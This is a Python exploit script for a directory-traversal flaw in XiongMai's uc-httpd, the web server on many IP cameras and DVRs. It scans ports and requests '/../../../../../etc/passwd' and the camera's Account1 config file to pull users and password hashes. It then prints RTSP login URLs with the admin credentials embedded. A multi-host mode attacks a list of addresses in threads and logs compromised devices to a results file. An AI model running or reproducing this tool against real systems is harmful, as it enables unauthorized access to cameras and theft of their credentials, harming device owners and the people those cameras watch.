import datetime
import http.client
import io
import ipaddress
import json
import socket
import sys
import urllib.request
import threading
import tableprint as tp
from tqdm.auto import tqdm
import colorama

colorama.init()
class Colors:
	BLUE = '\033[94m'
	GREEN = '\033[32m'
	RED = '\033[0;31m'
	DEFAULT = '\033[0m'
	ORANGE = '\033[33m'
	YELLOW = '\x1b[33m'
	WHITE = '\033[97m'
	BOLD = '\033[1m'
	BR_COLOUR = '\033[1;37;40m'


ascii_art = '''
	[+]---------------------------------------------------------[+]
	| Vulnerable Software:      uc-httpd                          |
	| Vendor:                   XiongMai Technologies             |
	| Vulnerability Type:       LFI, Directory Traversal          |
	| Date Released:            03/04/2017                        |
	| Released by:              keksec                            |
	| Written by:               @Thang4mat                        |
	[+]---------------------------------------------------------[+]
	'''
print(ascii_art)

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsm_str = 'HTTP/1.0'

portlist = [554,80,81,82,83,84,85,86,87,88,89,34567]

def starttime():
	file = open('result.txt', 'a')
	file.write('\n[+] ' + str(datetime.datetime.now()) + '\n');
	file.close();

def portscan(host,portlist):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(2) 
	ports = []
	hostx = host
	port = 0
	for x in portlist:
		result = s.connect_ex((host,x))
		if result == 0:
			ports.append(x)
	if ports == []:
		port = 0
	else:
		for x in ports:
			port = x
			if port < 554:
				hostx = host + ':' + str(port)
				break
			elif port >= 554:
				hostx = host
	return hostx,port

def singlehost():
	try:
		done = portscan(host,portlist)
		hostx = done[0]
		port = done[1]
		# exploit
		passwd = urllib.request.urlopen('http://' + hostx + '/../../../../../etc/passwd', timeout=1).read()
		if len(passwd) >= 120:
			print(Colors.RED + '\n{}	This host is not vulnerable.'.format(host) + Colors.DEFAULT)
			sys.exit()
		else:
			print(' [+] Root (hashed):\t' + str(passwd))
		user = urllib.request.urlopen('http://' + hostx + '/../../../../../mnt/mtd/Config/Account1', timeout=1).read()
		u = io.TextIOWrapper(urllib.request.urlopen('http://' + hostx + '/../../../../../mnt/mtd/Config/Account1'),
							 encoding='utf-8').read()

		def userlist():
			dataJson = json.loads(u)
			totUsr = len(dataJson['Users'])

			print(' [+] Users List:\t' + Colors.ORANGE + str(totUsr) + Colors.DEFAULT)

			for obj in range(0, totUsr):
				_users = dataJson['Users'][obj]['Name']
				if _users == 'default':
					_cam = dataJson['Users'][obj]['AuthorityList']
					print(' [+] Monitors:\t\t' + Colors.ORANGE + str(len(_cam)) + Colors.DEFAULT + ' Channel(s)')

			if port == 34567:
				print(' [+] RTSP URL:\t\t' + Colors.ORANGE + 'Port 554 CLOSED. Port 34567 OPEN.' + Colors.DEFAULT)

			final_data = []
			cabeceras = []
			for obj in range(0, totUsr):
				temp = []
				_users = dataJson['Users'][obj]['Name']
				_password = dataJson['Users'][obj]['Password']
				_group = dataJson['Users'][obj]['Group']

				if _group == 'admin':
					username = dataJson['Users'][obj]['Name']
					password = dataJson['Users'][obj]['Password']
					if port == 554:
						print(' [+] RTSP URL:\t\t' + 'rtsp://' + host + ':554/user=' + Colors.ORANGE + username + Colors.DEFAULT + '&password=' + Colors.ORANGE + password + Colors.DEFAULT + '&channel=1&stream=0.sdp')
					if port not in [554,34567]:
						print(' [+] Login URL:\t\t' + Colors.GREEN + 'http://' + hostx + Colors.DEFAULT)

				temp.append(_users)
				temp.append(_password)
				temp.append(_group)
				final_data.append(temp)
				hdUsr = Colors.GREEN + 'Username' + Colors.DEFAULT
				hdPass = Colors.GREEN + 'Password (hashed)' + Colors.DEFAULT
				hdGroup = Colors.GREEN + 'Group' + Colors.DEFAULT
				cabeceras = [hdUsr, hdPass, hdGroup]
			tp.table(final_data, cabeceras, width=20)

		userlist()
		file = open(host + '.passwd.txt', 'wb')
		file.write(passwd);
		file.close();
		file = open(host + '.Account1.txt', 'wb')
		file.write(user);
		file.close();
		print('[+] Exported \'{}.passwd.txt\','.format(host) + '\'{}.Account1.txt\''.format(host))
		sys.exit()
	except KeyboardInterrupt:
		print('\n''You pressed Ctrl+C. Exit')
		sys.exit()
	except Exception as e:
		print(Colors.RED + '[DEBUG] ' + str(e) + Colors.DEFAULT)
		sys.exit()

def multihost(portlist):
	while True:
		try:
			host = str(ipaddress.ip_address(ii))
			done = portscan(host,portlist)
			hostx = done[0]
			port = done[1]
			passwd = urllib.request.urlopen('http://' + hostx + '/../../../../../etc/passwd', timeout=1).read()
			if len(passwd) >= 120:
				break
			else:			
				u = io.TextIOWrapper(urllib.request.urlopen('http://' + hostx + '/../../../../../mnt/mtd/Config/Account1'),encoding='utf-8').read()
				dataJson = json.loads(u)
				totUsr = len(dataJson['Users'])
				for obj in range(0, totUsr):
					_users = dataJson['Users'][obj]['Name']
					if _users == 'default':
						_cam = dataJson['Users'][obj]['AuthorityList']
						file = open('result.txt', 'a')
						file.write('* http://' + hostx + ' ' + str(len(_cam)) + ' Channel(s)\n')
						file.close();
				for obj in range(0, totUsr):
					_group = dataJson['Users'][obj]['Group']
					if _group == 'admin':
						username = dataJson['Users'][obj]['Name']
						password = dataJson['Users'][obj]['Password']
						if port == 554:
							file = open('result.txt', 'a')
							file.write('rtsp://' + host + ':554/user=' + username + '&password=' + password + '&channel=1&stream=0.sdp \n');
							file.close();
						elif port == 34567:
							file = open('result.txt', 'a')
							file.write(username + '\t' + password + '\tPort 554 CLOSED. Port 34567 OPEN.\n');
							file.close();
						elif port not in [554, 34567]:
							file = open('result.txt', 'a')
							file.write(username + '\t' + password + '\tRTSP Port CLOSED.\n');
							file.close();
			break
		except Exception:
			break
		except KeyboardInterrupt:
			print('\n''You pressed Ctrl+C. Exit.')
			sys.exit()

try:
	print('[+] Usage:\n' + 'Single host: python3 ' + sys.argv[0] + ' 192.168.1.10\n' + 'Multi host: python3 ' + sys.argv[0] + ' list.txt')
	if len(sys.argv) > 1:
		if '.txt' in sys.argv[1]:
			starttime()
			d = open(sys.argv[1], 'r').readlines()
			print('All exploited host will be logged into the text file named \'result.txt\'')
			print('\nExploiting.....\n')
			for i in tqdm(d):
				ii = i.strip()
				t = threading.Thread(target=multihost,args=(portlist,))
				t.start()
		else: 
			host = str(ipaddress.ip_address(sys.argv[1]))
			print('\nExploiting.....\n')
			singlehost()
	else:
		print(Colors.RED + ' \n[ERROR] Please check your command again.' + Colors.DEFAULT)
		sys.exit()
except ValueError:
	print(Colors.RED + ' [ERROR] Not a valid IP address or Hosts list.' + Colors.DEFAULT)
	sys.exit()
except KeyboardInterrupt:
	print('\n''You pressed Ctrl+C. Exit.')
	sys.exit()